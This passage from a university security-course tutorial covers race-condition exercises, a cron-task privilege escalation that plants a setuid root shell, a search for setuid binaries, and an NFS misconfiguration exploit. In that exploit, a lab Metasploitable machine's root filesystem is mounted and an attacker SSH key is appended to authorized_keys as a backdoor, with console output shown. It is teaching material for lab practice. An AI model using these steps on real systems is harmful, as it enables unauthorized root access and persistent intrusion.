<strong><code class="docutils literal notranslate"><span class="pre">race2</span></code></strong></p><a class="sol-img reference internal image-reference" href="../_images/racec4.PNG"><img alt="../_images/racec4.PNG" class="sol-img align-center" src="../_images/racec4.PNG" style="width: 255.6px; height: 49.8px;" /></a>
</div><div class="collapse tp2_s6" id="tp2_6_5"><p class="centered">
<strong><code class="docutils literal notranslate"><span class="pre">clangrace</span></code></strong></p><a class="sol-img reference internal image-reference" href="../_images/racec5.PNG"><img alt="../_images/racec5.PNG" class="sol-img align-center" src="../_images/racec5.PNG" style="width: 270.59999999999997px; height: 103.8px;" /></a>
</div><div class="collapse tp2_s6" id="tp2_6_6"><p class="centered">
<strong><code class="docutils literal notranslate"><span class="pre">frace</span></code></strong></p><a class="sol-img reference internal image-reference" href="../_images/racec6.PNG"><img alt="../_images/racec6.PNG" class="sol-img align-center" src="../_images/racec6.PNG" style="width: 256.8px; height: 57.599999999999994px;" /></a>
</div><div class="collapse tp2_s6" id="tp2_6_7"><p class="centered">
<strong><code class="docutils literal notranslate"><span class="pre">srace</span></code></strong></p><a class="sol-img reference internal image-reference" href="../_images/racec7.PNG"><img alt="../_images/racec7.PNG" class="sol-img align-center" src="../_images/racec7.PNG" style="width: 251.39999999999998px; height: 69.0px;" /></a>
</div><div class="line-block">
<div class="line">We can also check with another compiler and see how that behaves,
let’s try and see how clang handles this race condition:</div>
</div>
<p class="centered">
<strong><code class="docutils literal notranslate"><span class="pre">clang</span> <span class="pre">-pthread</span> <span class="pre">-o</span> <span class="pre">clangrace</span> <span class="pre">threadrace.c</span></code></strong></p><div class="line-block">
<div class="line">❓ <strong>What happens if you remove the asterisk on line 6 of the code (change
from</strong> <code class="docutils literal notranslate"><span class="pre">*i</span> <span class="pre">=</span> <span class="pre">0;</span></code> <strong>to</strong>  <code class="docutils literal notranslate"><span class="pre">i</span> <span class="pre">=</span> <span class="pre">0;</span></code> <strong>)? Can you explain why this works?</strong></div>
</div>
<div class="line-block">
<div class="line">❓ <strong>Try to simplify the code and still achieve the same race condition.
What is the smallest example you can create that still fails to
terminate (with the help of compiler optimisation)?</strong></div>
</div>
<?php
      if($good) {
         //nothing
      } else {
         echo '<script type="text/javascript">',
                  'updateSol("tp2_6_1 tp2_6_2 tp2_6_3 tp2_6_4 tp2_6_5 tp2_6_6 tp2_6_7",".tp2_s6","thread-race-conditions-from-lecture");',
               '</script>';
         include "../_static/solution.html";
      }
?></div>
<div class="section" id="a-bad-cron-task">
<h3>A bad cron task<a class="headerlink" href="#a-bad-cron-task" title="Permalink to this headline">¶</a></h3>
<p>On a unix system, a “cron task” is a task that will automatically run at
a scheduled time. These tasks are usually used to perform backups and
other recurring tasks.</p>
<p>The configuration os those tasks is stored in <code class="docutils literal notranslate"><span class="pre">/etc/crontab</span></code> and its
structure is defined this way:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="c1"># ┌───────────── minute (0 - 59)</span>
<span class="c1"># │ ┌───────────── hour (0 - 23)</span>
<span class="c1"># │ │ ┌───────────── day of the month (1 - 31)</span>
<span class="c1"># │ │ │ ┌───────────── month (1 - 12)</span>
<span class="c1"># │ │ │ │ ┌───────────── day of the week (0 - 6) (Sunday=0 or 7)</span>
<span class="c1"># │ │ │ │ │</span>
<span class="c1"># │ │ │ │ │</span>
<span class="c1"># │ │ │ │ │</span>
<span class="c1"># * * * * * user-name command to be executed</span>
</pre></div>
</div>
<p>So if we want to create a task ran by the user root that runs every hour
at XXh15 and is executed by root we’ll add:</p>
<p class="centered">
<strong><code class="docutils literal notranslate"><span class="pre">15</span> <span class="pre">*</span> <span class="pre">*</span> <span class="pre">*</span> <span class="pre">*</span> <span class="pre">root</span> <span class="pre">echo</span> <span class="pre">&quot;hello</span> <span class="pre">world&quot;</span></code></strong></p><div class="line-block">
<div class="line">With this entry, the user root will execute “echo ’hello world’” every
hour (at 00:15, 1:15, 2:15, 3:15, …).</div>
</div>
<div class="line-block">
<div class="line">Of course, a user can’t add an entry to be executed by user “root”
that would be far too easy :)</div>
</div>
<div class="line-block">
<div class="line">But if you inspect the already existing cron tasks, you might find one
that’s executed by root and where a user is able to modify the
executed file. If you’re able to modify a file that’s executed by
root, you can actually add some code that will be executed by the user
root.</div>
</div>
<ol class="arabic">
<li><p class="first">Inspect the list of cron tasks and find the tasks running as root</p>
<p class="centered">
<strong><code class="docutils literal notranslate"><span class="pre">cat</span> <span class="pre">/etc/crontab</span></code></strong></p></li>
</ol>
<div class="collapse tp2_s7" id="tp2_7_1"><p class="centered">
<strong><code class="docutils literal notranslate"><span class="pre">srace</span></code></strong></p><a class="sol-img reference internal image-reference" href="../_images/crontab.PNG"><img alt="../_images/crontab.PNG" class="sol-img align-center" src="../_images/crontab.PNG" style="width: 500.4px; height: 225.6px;" /></a>
</div><ol class="arabic" start="2">
<li><p class="first">Check the permissions of the files executed by these tasks</p>
<p class="centered">
<strong><code class="docutils literal notranslate"><span class="pre">ls</span> <span class="pre">-laht</span> <span class="pre">FILE_NAME</span></code></strong></p></li>
</ol>
<div class="collapse tp2_s7" id="tp2_7_2"><p class="centered">
<strong><code class="docutils literal notranslate"><span class="pre">srace</span></code></strong></p><a class="sol-img reference internal image-reference" href="../_images/crontab7.PNG"><img alt="../_images/crontab7.PNG" class="sol-img align-center" src="../_images/crontab7.PNG" style="width: 352.8px; height: 378.0px;" /></a>
</div><ol class="arabic" start="3">
<li><p class="first">If you find a file you can modify as a user, you’ve found a security
breach</p>
</li>
<li><p class="first">Edit this file (using vi, emacs, nano, gedit..) and add some code. A
good idea here, could be to add code to copy the binary of a shell
(for instance <code class="docutils literal notranslate"><span class="pre">zsh;</span></code> <strong>don’t use bash</strong>) by doing something like</p>
<p class="centered">
<strong><code class="docutils literal notranslate"><span class="pre">cp</span> <span class="pre">/bin/zsh</span> <span class="pre">/bin/myzsh</span></code></strong></p><p>The copy of your shell will still belong to root. So to make it
exploitable by a user, juste set the setuid flag on your copy of the
shell by doing something like</p>
<p class="centered">
<strong><code class="docutils literal notranslate"><span class="pre">chmod</span> <span class="pre">+s</span> <span class="pre">/bin/myzsh</span></code></strong></p></li>
<li><p class="first">The next time the cron task runs, it will execute the code you added.
You should then have an executable shell (<code class="docutils literal notranslate"><span class="pre">/bin/myzsh</span></code>) with the
setuid flag set</p>
</li>
<li><p class="first">If you run this file, it will start a shell as root (because of the
setuid flag)</p>
</li>
<li><p class="first">You now have a shell with the root privileges :)</p>
</li>
</ol>
<?php
      if($good) {
         //nothing
      } else {
         echo '<script type="text/javascript">',
                  'updateSol("tp2_7_1 tp2_7_2",".tp2_s7","a-bad-cron-task");',
               '</script>';
         include "../_static/solution.html";
      }
?></div>
<div class="section" id="finding-a-target">
<h3>Finding a Target<a class="headerlink" href="#finding-a-target" title="Permalink to this headline">¶</a></h3>
<p>We know that we can exploit the system if we can find a suitably
vulnerable program to exploit. For this we want three things:</p>
<ul class="simple">
<li>An executable owned by root</li>
<li>This executable has the setuid flag set</li>
<li>We believe this executable has a vulnerablility (e.g. bad string
sanitization, integer overflow, buffer overflow, etc.).</li>
</ul>
<div class="line-block">
<div class="line">So if we can find a program with these properties we should be able to
execute some other code that we choose as the root user, and this in
turn will allow us to access the Target.</div>
</div>
<div class="line-block">
<div class="line">Let’s see if we can find such a program somewhere on the system. We
can do this withsanitisation</div>
</div>
<p class="centered">
<strong><code class="docutils literal notranslate"><span class="pre">find</span> <span class="pre">/</span> <span class="pre">-user</span> <span class="pre">root</span> <span class="pre">-perm</span> <span class="pre">/u+s</span> <span class="pre">-exec</span> <span class="pre">ls</span> <span class="pre">-l</span> <span class="pre">{}</span> <span class="pre">+</span> <span class="pre">2&gt;/dev/null</span></code></strong></p><div class="collapse tp2_s8" id="tp2_7_1"><a class="sol-img reference internal image-reference" href="../_images/target.PNG"><img alt="../_images/target.PNG" class="sol-img align-center" src="../_images/target.PNG" style="width: 466.79999999999995px; height: 274.8px;" /></a>
</div><div class="line-block">
<div class="line">This finds any executable owned by root that has the setuid flag set
(and the <code class="docutils literal notranslate"><span class="pre">2&gt;/dev/null</span></code> ignores errors).</div>
</div>
<div class="line-block">
<div class="line">Note that you should find several of these programs on a normal
system. The next step would be to see which are vulnerable to some
kind of vulnerability. This could be done in different ways, for
example:</div>
</div>
<ol class="arabic simple">
<li>Reverse engineering the binary via disassembly</li>
<li>run the program through a debugger to observe the behaviour and find
a weak point</li>
<li>analyse the source code (if available)</li>
<li>Fuzzing to try and find a flaw</li>
</ol>
<div class="line-block">
<div class="line">These would all take significant time and effort, but are standard
work for a hacker or experienced security analyst.</div>
</div>
<div class="line-block">
<div class="line">In future classes we’ll look at some of these approaches and how to
build and insert exploits. For now (if there is time) you can do any
of the following:</div>
</div>
<ol class="arabic simple">
<li>go back and do the bonus exercises</li>
<li>see if you can create an exploitable program and crash it</li>
<li>see if you can crash one of the programs you found above.</li>
</ol>
<?php
      if($good) {
         //nothing
      } else {
         echo '<script type="text/javascript">',
                  'updateSol("tp2_8_1",".tp2_s8","finding-a-target");',
               '</script>';
         include "../_static/solution.html";
      }
?></div>
</div>
<div class="section" id="nfs-share-exploit-metasploit">
<h2>NFS Share exploit - Metasploit<a class="headerlink" href="#nfs-share-exploit-metasploit" title="Permalink to this headline">¶</a></h2>
<div class="section" id="introduction">
<h3>Introduction<a class="headerlink" href="#introduction" title="Permalink to this headline">¶</a></h3>
<p>The Network File System protocol allows you to mount a system/directory
of a remote server over a network on your own device much like a local
storage would.</p>
<p>NFS usually only allow a specific IP to access some specific directory
but if it is badly configured everyone can have access to the remote
machine.</p>
<p>The following command can tell you if there is any exported directories
oby the NFS server.</p>
<div class="code console highlight-default notranslate"><div class="highlight"><pre><span></span>kali@kali:~$ showmount -e 192.168.2.212
Export list for 192.168.2.212:
/nfsshare 192.168.2.101
</pre></div>
</div>
<p>In this case the remote server with IP 192.168.2.212 has the ‘/nfsshare‘
directory open for IP 192.168.2.101.</p>
<p>In our case we will see how to exploit a misconfigured NFS server which
would display something like this when using the same command :</p>
<div class="code console highlight-default notranslate"><div class="highlight"><pre><span></span>kali@kali:~$ showmount -e 192.168.2.212
Export list for 192.168.2.212:
/ *
</pre></div>
</div>
<p>This tells us that the root directory is available to any IP address.</p>
</div>
<div class="section" id="setup">
<h3>Setup<a class="headerlink" href="#setup" title="Permalink to this headline">¶</a></h3>
<p>For this exploit we will need an additional Virtual Machine to act as
the NFS Server. We will be using the Metasploitable VM that is
specificly designed to have many vulnerabilities.</p>
<p>Download the Kali VM from this link</p>
<p class="centered">
<strong><a class="reference external" href="https://transvol.sgsi.ucl.ac.be/download.php?id=04154fac75807165">https://transvol.sgsi.ucl.ac.be/download.php?id=04154fac75807165</a> (3.05 Go)</strong></p><div class="line-block">
<div class="line">Working directory: <code class="docutils literal notranslate"><span class="pre">~/SecurityClass/Tutorial-Extra</span></code></div>
<div class="line">Connection:</div>
</div>
<table border="1" class="docutils">
<colgroup>
<col width="50%" />
<col width="50%" />
</colgroup>
<thead valign="bottom">
<tr class="row-odd"><th class="head"><strong>username</strong></th>
<th class="head"><strong>password</strong></th>
</tr>
</thead>
<tbody valign="top">
<tr class="row-even"><td>admin</td>
<td>nimda</td>
</tr>
</tbody>
</table>
<p><em>The default keyboard layout is US so be carefull</em></p>
<p>The next thing you need to do is to change the default network settings
on both your Kali and Metasploitable VMs.</p>
<p>For each VM in Virtualbox go to Settings -&gt; Networks and change NAT for
Bridged networking. This will allow Kali to communicate with the other
VM and vice-versa.</p>
</div>
<div class="section" id="exploit">
<h3>Exploit<a class="headerlink" href="#exploit" title="Permalink to this headline">¶</a></h3>
<p>The first thing we need to do is fetch the target’s IP address. In my
case it is 192.168.2.212 .</p>
<p>Using <code class="docutils literal notranslate"><span class="pre">nmap</span></code> we can scan a remote IP address to see if there are any
open ports :</p>
<div class="code console highlight-default notranslate"><div class="highlight"><pre><span></span>kali@kali:~$ nmap -p0-65535 192.168.2.212
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-23 13:13 EDT
Nmap scan report for 192.168.2.212
Host is up (0.0038s latency).
Not shown: 65505 closed ports
PORT      STATE    SERVICE
0/tcp     filtered unknown
21/tcp    open     ftp
22/tcp    open     ssh
23/tcp    open     telnet
25/tcp    open     smtp
53/tcp    open     domain
80/tcp    open     http
111/tcp   open     rpcbind
139/tcp   open     netbios-ssn
445/tcp   open     microsoft-ds
512/tcp   open     exec
513/tcp   open     login
514/tcp   open     shell
1099/tcp  open     rmiregistry
1524/tcp  open     ingreslock
2049/tcp  open     nfs
2121/tcp  open     ccproxy-ftp
3306/tcp  open     mysql
3632/tcp  open     distccd
5432/tcp  open     postgresql
5900/tcp  open     vnc
6000/tcp  open     X11
6667/tcp  open     irc
6697/tcp  open     ircs-u
8009/tcp  open     ajp13
8180/tcp  open     unknown
8787/tcp  open     msgsrvr
39804/tcp open     unknown
51060/tcp open     unknown
53327/tcp open     unknown
57207/tcp open     unknown

Nmap done: 1 IP address (1 host up) scanned in 5.30 seconds
</pre></div>
</div>
<p>We can see that there are a lot of open ports on this machine as well as
the default port for nfs : 2049.</p>
<p>So we now that NFS is running so let’s check what directories can be
mounted using the previously used command :</p>
<div class="code console highlight-default notranslate"><div class="highlight"><pre><span></span>kali@kali:~$ showmount -e 192.168.2.212
Export list for 192.168.2.212:
/ *
</pre></div>
</div>
<p>This is bad.. But this is something we can exploit ! We will create a
new directory on our Kali machine and mount the remote directory.</p>
<div class="code console highlight-default notranslate"><div class="highlight"><pre><span></span>kali@kali:~$ mkdir /tmp/access
kali@kali:~$ mount -t nfs 192.168.2.212:/ /tmp/access/
</pre></div>
</div>
<p>This will mount the root directory of 192.168.2.212 on our /tmp/access/
directory using NFS as file system.</p>
<p>We can check that it is indeed mounted using the following command
<code class="docutils literal notranslate"><span class="pre">df</span> <span class="pre">-k</span></code>:</p>
<div class="code console highlight-default notranslate"><div class="highlight"><pre><span></span>kali@kali:~$ df -k
Filesystem      1K-blocks    Used Available Use% Mounted on
udev               972680       0    972680   0% /dev
tmpfs              199768     980    198788   1% /run
/dev/sda1        79980100 8847436  67026888  12% /
tmpfs              998836       0    998836   0% /dev/shm
tmpfs                5120       0      5120   0% /run/lock
tmpfs              998836       0    998836   0% /sys/fs/cgroup
tmpfs              199764     152    199612   1% /run/user/1000
192.168.2.212:/   7282176 1383680   5531392  21% /tmp/access
</pre></div>
</div>
<p>Perfect ! Now you should be able to move to the <code class="docutils literal notranslate"><span class="pre">/tmp/access</span></code>
directory and list all the files on the remote machine.</p>
</div>
<div class="section" id="backdoor">
<h3>Backdoor<a class="headerlink" href="#backdoor" title="Permalink to this headline">¶</a></h3>
<p>That’s good but we want an easy access to the machine by logging in as a
user. If you go to the <code class="docutils literal notranslate"><span class="pre">/tmp/access/home</span></code> you can see that there is a
user called msfadmin which we assume we don’t know the password. We have
see before that the SSH is open so we can use it to create a backdoor.
Go to <code class="docutils literal notranslate"><span class="pre">/tmp/access/home/msfadmin/.ssh</span></code> and list all the files over
there.</p>
<div class="code console highlight-default notranslate"><div class="highlight"><pre><span></span>kali@kali:/tmp/access/home/msfadmin/.ssh$ ls
authorized_keys  id_rsa  id_rsa.pub
</pre></div>
</div>
<p>Perfect ! We can use the <code class="docutils literal notranslate"><span class="pre">authorized_keys</span></code> file to append our own ssh
public key and access this user easily.</p>
<p>First we need to generate a new ssh key on our Kali machine.</p>
<div class="code console highlight-default notranslate"><div class="highlight"><pre><span></span>kali@kali:~$ ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/home/kali/.ssh/id_rsa): nfs_rsa
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in nfs_rsa
Your public key has been saved in nfs_rsa.pub
</pre></div>
</div>
<p>Go back to the remote <code class="docutils literal notranslate"><span class="pre">.ssh</span></code> folder and append your public key to the
<code class="docutils literal notranslate"><span class="pre">authorized_keys</span></code>file :</p>
<div class="code console highlight-default notranslate"><div class="highlight"><pre><span></span>kali@kali:/tmp/access/home/msfadmin/.ssh$ cat /home/kali/nfs_rsa.pub &gt;&gt; authorized_keys
</pre></div>
</div>
<p>If everything went well you should now be able to access the remote
machine as <code class="docutils literal notranslate"><span class="pre">msfadmin</span></code>.</p>
<p>You can specify the public key to use when using ssh with the flag
<code class="docutils literal notranslate"><span class="pre">-i</span></code>.</p>
<div class="code console highlight-default notranslate"><div class="highlight"><pre><span></span>kali@kali:~$ ssh -i nfs_rsa msfadmin@192.168.2.212
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

To access official Ubuntu documentation, please visit:
http://help.ubuntu.com/
No mail.
Last login: Thu Jul 23 16:43:59 2020 from 192.168.2.231
msfadmin@metasploitable:~$ whoami
msfadmin
msfadmin@metasploitable:~$
</pre></div>
</div>
<p>Tadam !</p>
</div>
</div>
</div>


    </div>
      
  </div>
</div>
<footer class="footer">
  <div class="container">
    <p class="pull-right">
      <a id="up" href="#">
        <span class="fa fa-chevron-up"></span>
      </a>
      
        <br/>
        
      
    </p>
    <p>
        &copy; Copyright 2022, Legay Axel, Duchene Fabien, Crochet Christophe, Sebastien Strebelle, Thomas Given-Wilson, Schmitz Donatien.<br/>
      Created using <a href="http://sphinx-doc.org/">Sphinx</a> 1.8.5.<br/>
    </p>
  </div>
</footer>
  </body>
</html>